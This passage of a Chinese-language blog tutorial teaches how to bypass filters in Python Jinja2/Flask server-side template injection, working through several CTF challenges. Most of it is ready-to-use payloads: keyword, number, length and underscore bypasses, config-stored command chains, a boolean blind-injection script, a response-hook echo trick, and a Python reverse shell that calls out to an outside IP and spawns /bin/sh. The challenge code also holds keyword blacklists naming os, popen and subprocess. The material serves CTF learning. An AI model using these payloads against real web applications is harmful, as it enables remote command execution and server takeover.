class="built_in">print</span>(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"><span class="comment">#输出os</span></span><br></pre></td></tr></table></figure><p>​假设过滤了关键字class、base、os、popen，我们可以构造如下payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>][<span class="string">&#x27;__ba&#x27;</span>+<span class="string">&#x27;se__&#x27;</span>][<span class="string">&#x27;__subclass&#x27;</span>+<span class="string">&#x27;es__&#x27;</span>]()[<span class="number">306</span>][<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__glob&#x27;</span>+<span class="string">&#x27;als__&#x27;</span>][<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>][<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;who&#x27;</span>+<span class="string">&#x27;ami&#x27;</span>)[<span class="string">&#x27;re&#x27;</span>+<span class="string">&#x27;ad&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="数字过滤绕过"><a href="#数字过滤绕过" class="headerlink" title="数字过滤绕过"></a>数字过滤绕过</h3><p>​假设过滤了数字，我们可以采用内置方法length和int获取数字，如果长度有所限制，则可以搭配request对象来绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> a=<span class="string">&#x27;aaaa&#x27;</span>|length%&#125;&#123;%<span class="built_in">print</span>(a)%&#125;<span class="comment">#输出整型4</span></span><br><span class="line">&#123;%<span class="built_in">set</span> a=request.args.a|<span class="built_in">int</span>%&#125;&#123;%<span class="built_in">print</span>(a)%&#125;<span class="comment">#GET参数传入123，输出整型123</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(request.args.a|<span class="built_in">int</span>)&#125;&#125;<span class="comment">#GET参数输入306，获取到第306个子类</span></span><br></pre></td></tr></table></figure><h3 id="长度绕过"><a href="#长度绕过" class="headerlink" title="长度绕过"></a>长度绕过</h3><h4 id="使用长度较短的payload："><a href="#使用长度较短的payload：" class="headerlink" title="使用长度较短的payload："></a>使用长度较短的payload：</h4><p>​这里我先给出一个简单的示例</p><h5 id="原题：imaginaryCTF-2022-SSTI-Golf"><a href="#原题：imaginaryCTF-2022-SSTI-Golf" class="headerlink" title="原题：imaginaryCTF 2022 - SSTI Golf"></a>原题：imaginaryCTF 2022 - SSTI Golf</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/length-limiti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>():</span><br><span class="line">    query = request.args[<span class="string">&#x27;query&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;query&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">else</span> <span class="string">&#x27;...&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(query))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(query) &gt; <span class="number">49</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too long!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(query)</span><br></pre></td></tr></table></figure><p>​在这个示例中，限制了长度为49，如果使用之前提到的方式去注入，显然会出现过长的情况。所以这里要使用其他的方式进行注入，比如使用Flask内置的全局函数。</p><p>​<strong>url_for</strong>：此函数全局空间下存在 <strong>eval()</strong> 和 <strong>os 模块</strong></p><p>​<strong>lipsum</strong>：此函数全局空间下存在 <strong>eval()</strong> 和 <strong>os 模块</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/python-ssti/image-20241218123117627.png" alt="image-20241218123117627"></p><h4 id="将payload保存在config中"><a href="#将payload保存在config中" class="headerlink" title="将payload保存在config中"></a>将payload保存在config中</h4><p>​我们已知config实际上是一个保存了全局变量的字典：</p><p><img src="/img/python-ssti/image-20241218123401297.png" alt="image-20241218123401297"></p><p>​那么我们就可以使用赋值的方式将payload保存在config中。而set方法则是设置变量，所以我们可以实现如下操作：</p><p><img src="/img/python-ssti/image-20241218123641662.png" alt="image-20241218123641662"></p><p>​可以看到，s:string被保存到了config中，所以我们可以将payload保存在config中，以此绕过长度限制。以下是一个简单的示例：</p><h5 id="原题：imaginaryCTF-2022-minigolf"><a href="#原题：imaginaryCTF-2022-minigolf" class="headerlink" title="原题：imaginaryCTF 2022 - minigolf"></a>原题：imaginaryCTF 2022 - minigolf</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/config-bypass&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">config_bypass</span>():</span><br><span class="line">    blacklist = [<span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(request.args)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;txt&quot;</span> <span class="keyword">in</span> request.args.keys():</span><br><span class="line">        txt = html.escape(request.args[<span class="string">&quot;txt&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>([n <span class="keyword">in</span> txt <span class="keyword">for</span> n <span class="keyword">in</span> blacklist]):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Not allowed.&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(txt) &lt;= <span class="number">69</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(txt)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Too long.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br></pre></td></tr></table></figure>​分析代码可知，这里将长度限制在69，且拦截部分关键词，这里我们对拦截的关键词进行简单的绕过：'{{'和'}}'：这里拦截了花括号，我们可以使用{%%}绕过。'['和']'：这里拦截可中括号，导致我们无法调用对象方法，我们可以使用attr()过滤器来代替。'_'：拦截了下划线，导致我们无法调用魔术方法，这里可以使用attr()配合字符编码或者从request对象中获取参数来绕过。​在明晰了绕过方法后，我们先选择payload，基于这个payload的去构造config：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__.os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>​由于url_for中有一个下划线，所以这里我们选择lipsum方法。我们先将lipsum放入config中<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>%20x=config.update(l=lipsum)%&#125;</span><br></pre></td></tr></table></figure>​![image-20241218125208854](/img/python-ssti/image-20241218125208854.png)​然后把globals放入config中，这里由于下划线被拦截，所以我们利用request对象绕一下。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>%20x=config.update(c=request.args.g)%&#125;&#123;%<span class="built_in">print</span>(config)%&#125;&amp;g=__globals__</span><br></pre></td></tr></table></figure>![image-20241218125507640](/img/python-ssti/image-20241218125507640.png)​ 利用放入了config配置文件中的globals字符串获取全局方法，并放入config中：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>%20x=config.update(f=config.l|attr(config.c))%&#125;&#123;%<span class="built_in">print</span>(config)%&#125;</span><br></pre></td></tr></table></figure>​这里使用了attr去绕过了[]，不使用'.'是因为config.l使用了'.'再使用点会导致语法错误。![image-20241218132923973](/img/python-ssti/image-20241218132923973.png)​然后就是获取os模块：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>%20x=config.update(o=config.f.os)%&#125;&#123;%<span class="built_in">print</span>(config)%&#125;</span><br></pre></td></tr></table></figure>​![image-20241218133223143](/img/python-ssti/image-20241218133223143.png)​获取popen方法：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>%20x=config.update(p=config.o.popen)%&#125;&#123;%<span class="built_in">print</span>(config)%&#125;</span><br></pre></td></tr></table></figure>​![image-20241218133344217](/img/python-ssti/image-20241218133344217.png)​然后就可以进行命令执行了：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=&#123;%<span class="built_in">print</span>(config.p(request.args.a).read())%&#125;&amp;a=whoami</span><br></pre></td></tr></table></figure>​![image-20241218133501552](/img/python-ssti/image-20241218133501552.png)<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>​上述所有的讨论都是在有回显的情况下进行的注入，但是比赛中并不是所有题目都会给出回显，而针对没有回显的情况一般就几种方式，盲注，写文件，弹shell，或者用钩子函数外带结果，这里先介绍盲注和钩子函数。</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>这里给出一个简单的示例：</p><h5 id="原题：第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）-Safe-Proxy"><a href="#原题：第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）-Safe-Proxy" class="headerlink" title="原题：第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）- Safe_Proxy"></a>原题：第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）- Safe_Proxy</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    template_code = request.form.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span></span><br><span class="line">    result = render_template_string(template_code)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;error&#x27;</span></span><br></pre></td></tr></table></figure><p>​这里是一个显然的盲注，因为渲染的结果没有返回到前端中，且这里还拦截了一些关键字，我们开始分析：</p><p>import，os，sys，eval，subprocess，popen，system：这些关键字的拦截我们可以使用字符串拼接绕过的方式来实现绕过。</p><p>__：针对下划线的绕过我们可以采用十六进制编码绕过。</p><p>\r，\n：这两个拦截是凑字数的，没有任何的作用。</p><p>​这里我们已知结果不会返回前端，那么我们就需要使用盲注，这里先使用布尔盲注，写出payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>+allchar=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789!@#$%^%26*()-_+&#123;&#125;[]|:;?/&gt;&lt;.,ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>+a=<span class="string">&#x27;os&#x27;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>+b=<span class="string">&#x27;popen&#x27;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>+res=url_for[<span class="string">&#x27;__globals__&#x27;</span>][a][b](<span class="string">&#x27;whoami&#x27;</span>).read()%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span>+res[<span class="number">0</span>]==allchar[<span class="number">0</span>]%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="number">1</span>)%&#125;</span><br><span class="line">&#123;%<span class="keyword">else</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(sleep(<span class="number">1</span>))%&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>​绕过关键字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>+allchar=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789!@#$%^%26*()-_+&#123;&#125;[]|:;?/&gt;&lt;.,ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>+a=<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>+b=<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>+res=url_for[<span class="string">&#x27;__globals__&#x27;</span>][a][b](<span class="string">&#x27;whoami&#x27;</span>).read()%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span>+res[<span class="number">0</span>]==allchar[<span class="number">0</span>]%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="number">1</span>)%&#125;</span><br><span class="line">&#123;%<span class="keyword">else</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(sleep(<span class="number">1</span>))%&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>​绕过下划线</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>+allchar=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789!@#$%^%26*()-_+&#123;&#125;[]|:;?/&gt;&lt;.,ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>+a=<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>+b=<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span>+res=url_for[<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>][a][b](<span class="string">&#x27;whoami&#x27;</span>).read()%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span>+res[<span class="number">0</span>]==allchar[<span class="number">0</span>]%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="number">1</span>)%&#125;</span><br><span class="line">&#123;%<span class="keyword">else</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(sleep(<span class="number">1</span>))%&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>​简单解释一下，该payload首先把所有字符都放在了一个字符串中，便于爆破，然后定义了os和popen字符串，在通过url_for这个内置方法执行命令，并把结果存入到res中。最后通过if去爆破字符串，当相同时程序正常执行，当不同时程序出现异常报错，从而达到猜出字符串的目的。</p><p><img src="/img/python-ssti/image-20241218151642759.png" alt="image-20241218151642759"></p><p>​得到爆破后的结果，用脚本处理一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()-_+&#123;&#125;[]|:;?/&gt;&lt;.,ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_and_process_data</span>(<span class="params">file_path</span>):</span><br><span class="line">    extracted_data = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, mode=<span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            parts = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">3</span>:</span><br><span class="line">                second_col = parts[<span class="number">1</span>]</span><br><span class="line">                third_col = <span class="built_in">int</span>(parts[<span class="number">2</span>])</span><br><span class="line">                extracted_data.append((second_col, third_col))</span><br><span class="line">    sorted_data = <span class="built_in">sorted</span>(extracted_data, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="number">0</span>]))</span><br><span class="line">    <span class="comment">#print(sorted_data)</span></span><br><span class="line">    <span class="keyword">return</span> sorted_data</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_file</span>(<span class="params">ascii_data, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, mode=<span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(<span class="string">&#x27;&#x27;</span>.join(ascii_data))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    input_file = <span class="string">&#x27;data.txt&#x27;</span></span><br><span class="line">    <span class="comment">#output_file = &#x27;res.txt&#x27;</span></span><br><span class="line">    sorted_data = read_and_process_data(input_file)</span><br><span class="line">    <span class="built_in">print</span>(sorted_data)</span><br><span class="line">    <span class="keyword">for</span> _i,k <span class="keyword">in</span> sorted_data:</span><br><span class="line">        <span class="built_in">print</span>(x[k],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>​<img src="/img/python-ssti/image-20241218151757183.png" alt="image-20241218151757183"></p><h4 id="钩子函数回显"><a href="#钩子函数回显" class="headerlink" title="钩子函数回显"></a>钩子函数回显</h4><p>这里给出一个简单示例：</p><h5 id="原题：2024“国城杯”网络安全挑战大赛-Ez-Gallery"><a href="#原题：2024“国城杯”网络安全挑战大赛-Ez-Gallery" class="headerlink" title="原题：2024“国城杯”网络安全挑战大赛-Ez_Gallery"></a>原题：2024“国城杯”网络安全挑战大赛-Ez_Gallery</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shell_view</span>(<span class="params">request</span>):</span><br><span class="line">    expression = request.GET.get(<span class="string">&#x27;shellcmd&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    blacklist_patterns = [<span class="string">r&#x27;.*length.*&#x27;</span>,<span class="string">r&#x27;.*count.*&#x27;</span>,<span class="string">r&#x27;.*[0-9].*&#x27;</span>,<span class="string">r&#x27;.*\..*&#x27;</span>,<span class="string">r&#x27;.*soft.*&#x27;</span>,<span class="string">r&#x27;.*%.*&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(re.search(pattern, expression) <span class="keyword">for</span> pattern <span class="keyword">in</span> blacklist_patterns):</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&#x27;wafwafwaf&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = jinja2.Environment(loader=jinja2.BaseLoader()).from_string(expression).render(&#123;<span class="string">&quot;request&quot;</span>: request&#125;)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&#x27;error&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​这里可以看到，渲染的结果是没有被返回的，也就是不存在回显，再分析一下waf</p><p>%：也就是把if，set给ban，上一个示例的方法也就行不通了。</p><p>length,count,[0-9],soft：把关键字和数字ban掉了，数字这里可以用request+int来绕，不过也可以采用不需要数字的方法来绕。</p><p>..：这里是把’.’给ban了，可以用中括号绕也可以用|attr绕过。</p><p>​这里着重介绍钩子函数回显，先构造payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.__init__.__globals__.__builtins__[<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;request.add_response_callback(lambda%20request,response:setattr(response,&#x27;text&#x27;,__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()))&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:request&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>​解析：这里是通过内置方法cycler，初始化，获取全区变量，获取所有内置函数，来获取exec方法，然后传入参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;request.add_response_callback(lambda%20request,response:setattr(response,&#x27;text&#x27;,__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()))&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;request&#x27;</span>:request&#125;</span><br></pre></td></tr></table></figure><p>​其中exec是一个执行python代码的方法，所这里的字符串就是要执行的python代码，这里的request就是要执行的python代码要传入的参数，这里的大意是，执行request类下的add_reponse_callback方法，前面是请求体，后面的response则是设置响应体和设置响应体的结果，这样就会将结果直接返回到前端中。接下来我们绕过一下’.’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler[<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;getattr(request,&#x27;add_response_callback&#x27;)(lambda%20request,response:setattr(response,&#x27;text&#x27;,getattr(getattr(__import__(&#x27;os&#x27;),&#x27;popen&#x27;)(&#x27;whoami&#x27;),&#x27;read&#x27;)()))&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:request&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/python-ssti/image-20241218162320046.png" alt="image-20241218162320046"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>​这种方式的前提是靶机能出网，我们使用上一个示例，构造payload，这里不再详细解析了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(request|attr(<span class="string">&#x27;POST&#x27;</span>)|attr(<span class="string">&#x27;get&#x27;</span>)(<span class="string">&#x27;shell&#x27;</span>))&#125;&#125;</span><br><span class="line"><span class="comment">#post传参</span></span><br><span class="line"><span class="comment">#shell=__import__(&#x27;os&#x27;).system(&#x27;python3 -c \&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;61.139.2.128&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)\&#x27;&#x27;)</span></span><br></pre></td></tr></table></figure><p>​<img src="/img/python-ssti/image-20241218162908445.png" alt="image-20241218162908445"></p><p>​<img src="/img/python-ssti/image-20241218162944530.png" alt="image-20241218162944530"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/2301_76690905/article/details/134301620?ops_request_misc=%7B%22request_id%22:%22ebffad6090e65ad2a71a5b5fdc9acae6%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=ebffad6090e65ad2a71a5b5fdc9acae6&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-134301620-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">最全SSTI模板注入waf绕过总结（6700+字数！）_ssti注入绕过-CSDN博客</a></p><p><a href="https://xz.aliyun.com/t/6885?time__1311=n4+xnD0Dg7excGDRDBqroGkDu7Qfpte4Dk0eD">Python模板注入(SSTI)深入学习 - 先知社区</a></p><p><a href="https://blog.csdn.net/weixin_43995419/article/details/126811287">Python Flask SSTI 之 长度限制绕过_python绕过长度限制的内置函数-CSDN博客</a></p><p><a 